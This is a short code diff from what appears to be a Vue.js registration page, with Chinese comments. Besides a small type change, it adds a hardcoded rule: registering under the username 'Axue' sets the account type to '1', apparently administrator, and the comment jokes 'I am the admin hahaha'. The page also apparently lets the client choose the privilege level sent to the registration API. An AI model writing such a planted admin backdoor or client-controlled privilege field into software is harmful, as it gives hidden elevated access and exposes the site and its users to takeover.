@@ -67,9 +67,12 @@ export default {
       let userInfo = {
         username: this.number,
         userpwd: this.pwd,
-        usertype: 2, // 写死的游客注册
+        usertype: '2', // 写死的游客注册
         userdate: this.$moment().format('YYYY-MM-DD')
       };
+      if (this.number === 'Axue') { // 我就是管理员哈哈哈哈
+        userInfo.usertype = '1';
+      }
       this.$axios.post('/api/admin/register', userInfo).then(res => {
         if (res.data.status === 0) { // 用户名已注册
           this.$Message.warning('该账号已被注册！');
